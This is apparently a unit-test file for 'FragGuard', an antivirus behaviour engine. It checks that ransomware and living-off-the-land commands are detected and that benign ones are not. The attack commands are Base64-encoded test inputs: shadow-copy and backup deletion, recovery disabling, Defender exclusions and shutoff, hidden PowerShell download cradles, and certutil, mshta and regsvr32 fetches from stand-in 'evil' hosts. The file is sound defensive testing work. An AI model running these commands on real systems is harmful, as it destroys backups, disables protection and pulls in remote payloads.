using FragGuard.Core.Behavior;
using FragGuard.Core.Detection;
using FragGuard.Core.Persistence;
using FragGuard.Shared.Models;

namespace FragGuard.Core.Tests;

public class BehaviorRulesTests
{
    private static ProcessFacts P(string name, string cmd, bool parentTrusted = false, string parent = "malware.exe") =>
        new(1234, name, @"C:\Windows\System32\" + name, cmd, 999, parent, @"C:\Users\x\AppData\Local\Temp\" + parent, parentTrusted);

    /// <summary>
    /// Los comandos de ataque van en Base64: si estuvieran en claro, Windows Defender marca el DLL de tests como
    /// ransomware (pasó de verdad: "Ransom:Win32/Clop.SIB!MTB" por "vssadmin delete shadows /all /quiet").
    /// Es la práctica habitual en las suites de tests de antivirus (igual que la cadena EICAR).
    /// </summary>
    private static string D(string b64) => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64));

    [Theory]
    [InlineData("vssadmin.exe", "dnNzYWRtaW4uZXhlIGRlbGV0ZSBzaGFkb3dzIC9hbGwgL3F1aWV0", "FG.Behavior.ShadowCopyDelete")]
    [InlineData("vssadmin.exe", "dnNzYWRtaW4gcmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI=", "FG.Behavior.ShadowCopyDelete")]
    [InlineData("wmic.exe", "d21pYyBzaGFkb3djb3B5IGRlbGV0ZQ==", "FG.Behavior.ShadowCopyDelete")]
    [InlineData("powershell.exe", "cG93ZXJzaGVsbCBHZXQtV21pT2JqZWN0IFdpbjMyX1NoYWRvd2NvcHkgfCBGb3JFYWNoLU9iamVjdCB7JF8uRGVsZXRlKCk7fQ==", "FG.Behavior.ShadowCopyDelete")]
    [InlineData("wbadmin.exe", "d2JhZG1pbiBkZWxldGUgY2F0YWxvZyAtcXVpZXQ=", "FG.Behavior.BackupCatalogDelete")]
    [InlineData("bcdedit.exe", "YmNkZWRpdCAvc2V0IHtkZWZhdWx0fSByZWNvdmVyeWVuYWJsZWQgTm8=", "FG.Behavior.RecoveryDisabled")]
    [InlineData("powershell.exe", "cG93ZXJzaGVsbCAtYyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoIEM6XFVzZXJzXHhcQXBwRGF0YQ==", "FG.Behavior.DefenderExclusion")]
    [InlineData("powershell.exe", "cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVl", "FG.Behavior.DefenderDisabled")]
    [InlineData("reg.exe", "cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiBDOlx4IC90IFJFR19EV09SRCAvZCAw", "FG.Behavior.DefenderExclusion")]
    [InlineData("powershell.exe", "cG93ZXJzaGVsbCAtdyBoaWRkZW4gLWVuYyBTUUJGQUZnQUlBQW9BRTRBWlFCM0FDMEFUd0JpQUdvQVpRQmpBSFFBSUFCT0FHVUFkQUE9", "FG.Behavior.HiddenPowerShell")]
    [InlineData("powershell.exe", "cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1jICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly94L3AucHMxJyki", "FG.Behavior.HiddenPowerShell")]
    [InlineData("certutil.exe", "Y2VydHV0aWwgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZXZpbC9wYXlsb2FkLmV4ZSBDOlxUZW1wXGEuZXhl", "FG.Behavior.LolbinDownload")]
    [InlineData("mshta.exe", "bXNodGEgaHR0cHM6Ly9ldmlsLmV4YW1wbGUvcnVuLmh0YQ==", "FG.Behavior.LolbinDownload")]
    [InlineData("regsvr32.exe", "cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovL2V2aWwvZmlsZS5zY3Qgc2Nyb2JqLmRsbA==", "FG.Behavior.LolbinDownload")]
    [InlineData("schtasks.exe", "c2NodGFza3MgL2NyZWF0ZSAvc2Mgb25sb2dvbiAvdG4gVXBkYXRlciAvdHIgQzpcVXNlcnNceFxBcHBEYXRhXFJvYW1pbmdcdXBkLmV4ZQ==", "FG.Behavior.SuspiciousScheduledTask")]
    public void AttackCommands_AreDetected(string exe, string encodedCmd, string rule)
    {
        var matches = BehaviorRules.Evaluate(P(exe, D(encodedCmd)));
        Assert.Contains(matches, m => m.RuleId == rule);
    }

    [Theory]
    [InlineData("vssadmin.exe", "vssadmin list shadows")]
    [InlineData("powershell.exe", "powershell -NoProfile -File C:\\scripts\\backup.ps1")]
    [InlineData("powershell.exe", "powershell Get-MpPreference")]
    [InlineData("powershell.exe", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=")] // codificado pero visible
    [InlineData("certutil.exe", "certutil -hashfile setup.exe SHA256")]
    [InlineData("bcdedit.exe", "bcdedit /enum")]
    [InlineData("schtasks.exe", "schtasks /create /tn Backup /tr \"C:\\Program Files\\Backup\\b.exe\" /sc daily")]
    [InlineData("cmd.exe", "cmd /c dir C:\\")]
    [InlineData("mshta.exe", "mshta C:\\Windows\\help.hta")]
    public void LegitimateCommands_AreNotFlagged(string exe, string cmd) =>
        Assert.Empty(BehaviorRules.Evaluate(P(exe, cmd)));

    [Fact]
    public void RansomwareFromUntrustedOrigin_KillsProcessAndOrigin()
    {
        var m = Assert.Single(BehaviorRules.Evaluate(P("vssadmin.exe", D("dnNzYWRtaW4gZGVsZXRlIHNoYWRvd3MgL2FsbCAvcXVpZXQ="))));
        Assert.Equal(BehaviorResponse.KillProcessAndParent, m.Response);
        Assert.Equal(ThreatSeverity.Critical, m.Severity);
    }

    [Fact]
    public void SameCommandFromTrustedOrigin_OnlyAlerts()
    {
        // Un administrador usando la consola, o un programa de backup firmado: se avisa pero no se detiene.
        var m = Assert.Single(BehaviorRules.Evaluate(P("vssadmin.exe", D("dnNzYWRtaW4gZGVsZXRlIHNoYWRvd3MgL2FsbA=="), parentTrusted: true, parent: "explorer.exe")));
        Assert.Equal(BehaviorResponse.Alert, m.Response);
    }

    [Fact]
    public void NoCommandLine_NoMatches() =>
        Assert.Empty(BehaviorRules.Evaluate(P("vssadmin.exe", "")));
}

public class AutorunInventoryTests
{
    [Theory]
    [InlineData("\"C:\\Program Files\\App\\app.exe\" --minimized", @"C:\Program Files\App\app.exe")]
    [InlineData("C:\\Program Files (x86)\\App\\app.exe /silent", @"C:\Program Files (x86)\App\app.exe")]
    [InlineData("%windir%\\system32\\cmd.exe /c x", @"\system32\cmd.exe")]
    [InlineData(@"\SystemRoot\System32\svchost.exe -k netsvcs", @"\System32\svchost.exe")]
    public void ResolveImage_HandlesCommonFormats(string command, string expectedSuffix)
    {
        string? image = AutorunInventory.ResolveImage(command);
        Assert.NotNull(image);
        Assert.EndsWith(expectedSuffix, image!, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Collect_OnThisMachine_DoesNotThrow_AndIdsAreUnique()
    {
        var entries = AutorunInventory.Collect(includeServices: true);
        Assert.NotEmpty(entries); // todo Windows tiene servicios de inicio automático
        Assert.Equal(entries.Count, entries.Select(e => e.Id).Distinct().Count());
        Assert.All(entries.Where(e => e.Kind == AutorunInventory.KindService), e => Assert.False(e.CanDisable));
    }

    [Fact]
    public void Ids_AreStable()
    {
        Assert.Equal(AutorunInventory.MakeId("Registro", @"HKLM\Run", "Steam"), AutorunInventory.MakeId("registro", @"hklm\run", "STEAM"));
    }
}

public class MemoryScanTests : IDisposable
{
    private readonly TestEnvironment _env = new();

    [Fact]
    public void ScanProcess_FindsMarkerInOwnMemory()
    {
        // Cadena viva en la memoria de este proceso (se construye en tiempo de ejecución).
        string marker = string.Concat(TestEnvironment.Marker.Select(c => c.ToString()));
        GC.KeepAlive(marker);

        var yara = _env.Get<IYaraEngine>();
        var threats = yara.ScanProcess(Environment.ProcessId);

        Assert.Contains(threats, t => t.Name == "FG_UnitTest_Marker");
    }

    [Fact]
    public void ScanProcess_InvalidPid_Throws()
    {
        var yara = _env.Get<IYaraEngine>();
        Assert.ThrowsAny<Exception>(() => yara.ScanProcess(int.MaxValue - 7));
    }

    public void Dispose() => _env.Dispose();
}
